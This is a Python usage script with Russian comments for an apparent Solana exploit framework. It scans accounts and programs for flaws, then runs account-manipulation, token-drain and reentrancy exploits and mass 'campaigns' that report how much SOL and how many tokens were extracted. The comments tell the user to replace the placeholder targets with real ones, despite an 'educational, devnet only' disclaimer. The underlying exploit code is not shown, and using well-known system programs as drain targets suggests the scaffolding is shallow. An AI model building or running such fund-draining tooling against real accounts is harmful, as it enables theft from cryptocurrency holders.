"""
Примеры использования Solana эксплойтов
"""

import asyncio
import logging
from solana.keypair import Keypair
from solana.publickey import PublicKey

from src.exploits import (
    ExploitManager,
    AccountExploit,
    TokenExploit,
    ProgramExploit,
    ReentrancyExploit,
    ExploitType
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def example_single_account_exploit():
    """Пример эксплойта одного аккаунта"""
    print("\n=== Пример эксплойта аккаунта ===")
    
    # Настройки (используйте devnet для тестирования)
    RPC_URL = "https://api.devnet.solana.com"
    
    # Создаем или загружаем keypair атакующего
    attacker_keypair = Keypair()  # В реальности загрузите существующий
    
    # Целевой аккаунт (замените на реальный)
    target_account = "11111111111111111111111111111112"  # System Program для примера
    
    try:
        # Создаем эксплойт
        account_exploit = AccountExploit(RPC_URL, attacker_keypair)
        
        # Сканируем цель
        print("Сканируем аккаунт...")
        scan_result = await account_exploit.scan_target(target_account)
        
        print(f"Результат сканирования: {scan_result}")
        
        if scan_result.get("vulnerable", False):
            print("Аккаунт уязвим! Выполняем эксплойт...")
            
            # Подготавливаем эксплойт
            if await account_exploit.prepare_exploit(target_account):
                # Выполняем эксплойт
                result = await account_exploit.execute_exploit(target_account)
                
                print(f"Результат эксплойта:")
                print(f"  Статус: {result.status}")
                print(f"  Извлечено SOL: {result.extracted_value}")
                print(f"  Время выполнения: {result.execution_time:.2f}с")
                print(f"  Транзакции: {len(result.transaction_signatures)}")
            else:
                print("Не удалось подготовить эксплойт")
        else:
            print("Аккаунт не уязвим")
            
    except Exception as e:
        print(f"Ошибка: {e}")

async def example_token_exploit():
    """Пример эксплойта токенов"""
    print("\n=== Пример эксплойта токенов ===")
    
    RPC_URL = "https://api.devnet.solana.com"
    attacker_keypair = Keypair()
    
    # Пример токен аккаунта (замените на реальный)
    token_account = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
    
    try:
        token_exploit = TokenExploit(RPC_URL, attacker_keypair)
        
        print("Сканируем токен аккаунт...")
        scan_result = await token_exploit.scan_target(token_account)
        
        print(f"Найдено уязвимостей: {len(scan_result.get('vulnerabilities', []))}")
        
        if scan_result.get("vulnerable", False):
            print("Выполняем эксплойт токенов...")
            result = await token_exploit.execute_exploit(token_account)
            
            print(f"Результат:")
            print(f"  Статус: {result.status}")
            print(f"  Извлечено токенов: {len(result.extracted_tokens or {})}")
            print(f"  Извлечено SOL: {result.extracted_value}")
        else:
            print("Токен аккаунт не уязвим")
            
    except Exception as e:
        print(f"Ошибка: {e}")

async def example_program_exploit():
    """Пример эксплойта программы"""
    print("\n=== Пример эксплойта программы ===")
    
    RPC_URL = "https://api.devnet.solana.com"
    attacker_keypair = Keypair()
    
    # Пример программы (замените на реальную)
    program_id = "11111111111111111111111111111112"
    
    try:
        program_exploit = ProgramExploit(RPC_URL, attacker_keypair)
        
        print("Сканируем программу...")
        scan_result = await program_exploit.scan_target(program_id)
        
        vulnerabilities = scan_result.get("vulnerabilities", [])
        print(f"Найдено уязвимостей программы: {len(vulnerabilities)}")
        
        for vuln in vulnerabilities:
            print(f"  - {vuln.vulnerability_type} ({vuln.severity})")
        
        if scan_result.get("vulnerable", False):
            print("Выполняем эксплойт программы...")
            result = await program_exploit.execute_exploit(program_id)
            
            print(f"Результат: {result.status}")
            if result.status.name == "SUCCESS":
                print(f"Извлечено: {result.extracted_value} SOL")
        else:
            print("Программа не уязвима")
            
    except Exception as e:
        print(f"Ошибка: {e}")

async def example_reentrancy_exploit():
    """Пример эксплойта reentrancy"""
    print("\n=== Пример эксплойта reentrancy ===")
    
    RPC_URL = "https://api.devnet.solana.com"
    attacker_keypair = Keypair()
    
    # Пример программы для reentrancy
    target_program = "11111111111111111111111111111112"
    
    try:
        reentrancy_exploit = ReentrancyExploit(RPC_URL, attacker_keypair)
        
        print("Сканируем на reentrancy уязвимости...")
        scan_result = await reentrancy_exploit.scan_target(target_program)
        
        vulnerabilities = scan_result.get("vulnerabilities", [])
        print(f"Найдено reentrancy уязвимостей: {len(vulnerabilities)}")
        
        if scan_result.get("vulnerable", False):
            print("Выполняем продвинутую reentrancy атаку...")
            result = await reentrancy_exploit.advanced_reentrancy_attack(target_program, max_depth=5)
            
            print(f"Результат reentrancy атаки:")
            print(f"  Статус: {result.status}")
            print(f"  Глубина: {result.metadata.get('max_depth_reached', 0)}")
            print(f"  Транзакций: {result.metadata.get('total_transactions', 0)}")
            print(f"  Извлечено: {result.extracted_value} SOL")
        else:
            print("Программа не уязвима к reentrancy")
            
    except Exception as e:
        print(f"Ошибка: {e}")

async def example_exploit_manager():
    """Пример использования менеджера эксплойтов"""
    print("\n=== Пример менеджера эксплойтов ===")
    
    RPC_URL = "https://api.devnet.solana.com"
    attacker_keypair = Keypair()
    
    try:
        # Создаем менеджер
        manager = ExploitManager(RPC_URL, attacker_keypair)
        
        # Список целей для тестирования
        targets = [
            "11111111111111111111111111111112",  # System Program
            "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",  # Token Program
            "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"   # Associated Token Program
        ]
        
        print("Выполняем массовое сканирование...")
        scan_summary = await manager.mass_scan(targets)
        
        print(f"Результаты массового сканирования:")
        print(f"  Всего целей: {scan_summary['total_targets']}")
        print(f"  Уязвимых целей: {scan_summary['vulnerable_targets']}")
        print(f"  Процент уязвимости: {scan_summary['vulnerability_rate']:.1f}%")
        print(f"  Всего уязвимостей: {scan_summary['total_vulnerabilities']}")
        
        # Если есть уязвимые цели, запускаем кампанию
        if scan_summary['vulnerable_targets'] > 0:
            print("\nЗапускаем кампанию эксплойтов...")
            
            vulnerable_targets = scan_summary['vulnerable_list'][:2]  # Берем первые 2
            
            campaign_id = await manager.start_campaign(
                campaign_name="Test Campaign",
                targets=vulnerable_targets,
                exploit_types=[ExploitType.ACCOUNT_MANIPULATION, ExploitType.TOKEN_DRAIN]
            )
            
            print(f"Кампания запущена: {campaign_id}")
            
            # Ждем немного и проверяем статус
            await asyncio.sleep(5)
            
            status = await manager.get_campaign_status(campaign_id)
            if status:
                print(f"Статус кампании:")
                print(f"  Прогресс: {status['progress']:.1f}%")
                print(f"  Успешных эксплойтов: {status['successful_exploits']}")
                print(f"  Неудачных эксплойтов: {status['failed_exploits']}")
                print(f"  Извлечено: {status['total_extracted']} SOL")
        
        # Показываем общую статистику
        stats = manager.get_statistics()
        print(f"\nОбщая статистика менеджера:")
        print(f"  Выполнено эксплойтов: {stats['total_exploits_executed']}")
        print(f"  Извлечено всего: {stats['total_value_extracted']} SOL")
        print(f"  Коэффициент успеха: {stats['success_rate']:.1f}%")
        print(f"  Активных кампаний: {stats['active_campaigns']}")
        
    except Exception as e:
        print(f"Ошибка: {e}")

async def example_comprehensive_target_analysis():
    """Пример комплексного анализа цели"""
    print("\n=== Комплексный анализ цели ===")
    
    RPC_URL = "https://api.devnet.solana.com"
    attacker_keypair = Keypair()
    
    # Цель для анализа
    target = "11111111111111111111111111111112"
    
    try:
        manager = ExploitManager(RPC_URL, attacker_keypair)
        
        print(f"Выполняем комплексное сканирование {target}...")
        comprehensive_scan = await manager.scan_target_comprehensive(target)
        
        print(f"Результаты комплексного сканирования:")
        print(f"  Цель: {comprehensive_scan['target']}")
        print(f"  Время сканирования: {comprehensive_scan['scan_time']}")
        print(f"  Всего уязвимостей: {comprehensive_scan['total_vulnerabilities']}")
        print(f"  Эксплуатируемая: {comprehensive_scan['exploitable']}")
        
        print(f"\nДетали по типам эксплойтов:")
        for exploit_type, result in comprehensive_scan['results'].items():
            vulnerable = result.get('vulnerable', False)
            vuln_count = len(result.get('vulnerabilities', []))
            
            print(f"  {exploit_type}:")
            print(f"    Уязвима: {vulnerable}")
            print(f"    Уязвимостей: {vuln_count}")
            
            if vulnerable and vuln_count > 0:
                print(f"    Типы уязвимостей:")
                for vuln in result.get('vulnerabilities', [])[:3]:  # Показываем первые 3
                    if hasattr(vuln, 'vulnerability_type'):
                        print(f"      - {vuln.vulnerability_type} ({vuln.severity})")
        
        # Если цель эксплуатируемая, выполняем все эксплойты
        if comprehensive_scan['exploitable']:
            print(f"\nВыполняем все возможные эксплойты...")
            all_results = await manager.execute_all_exploits(target)
            
            total_extracted = sum(r.extracted_value for r in all_results)
            successful = len([r for r in all_results if r.status.name == "SUCCESS"])
            
            print(f"Результаты выполнения всех эксплойтов:")
            print(f"  Всего эксплойтов: {len(all_results)}")
            print(f"  Успешных: {successful}")
            print(f"  Извлечено всего: {total_extracted} SOL")
            
            for result in all_results:
                if result.status.name == "SUCCESS":
                    print(f"  ✓ {result.exploit_type.value}: {result.extracted_value} SOL")
                else:
                    print(f"  ✗ {result.exploit_type.value}: {result.error_message}")
        
    except Exception as e:
        print(f"Ошибка: {e}")

async def main():
    """Главная функция с примерами"""
    print("=== Примеры использования Solana эксплойтов ===")
    print("ВНИМАНИЕ: Эти примеры предназначены только для образовательных целей!")
    print("Используйте только на devnet или с собственными аккаунтами!")
    
    try:
        # Запускаем примеры по очереди
        await example_single_account_exploit()
        await asyncio.sleep(1)
        
        await example_token_exploit()
        await asyncio.sleep(1)
        
        await example_program_exploit()
        await asyncio.sleep(1)
        
        await example_reentrancy_exploit()
        await asyncio.sleep(1)
        
        await example_exploit_manager()
        await asyncio.sleep(1)
        
        await example_comprehensive_target_analysis()
        
    except KeyboardInterrupt:
        print("\nПримеры прерваны пользователем")
    except Exception as e:
        print(f"Общая ошибка: {e}")
    
    print("\n=== Примеры завершены ===")

if __name__ == "__main__":
    # Запускаем примеры
    asyncio.run(main())
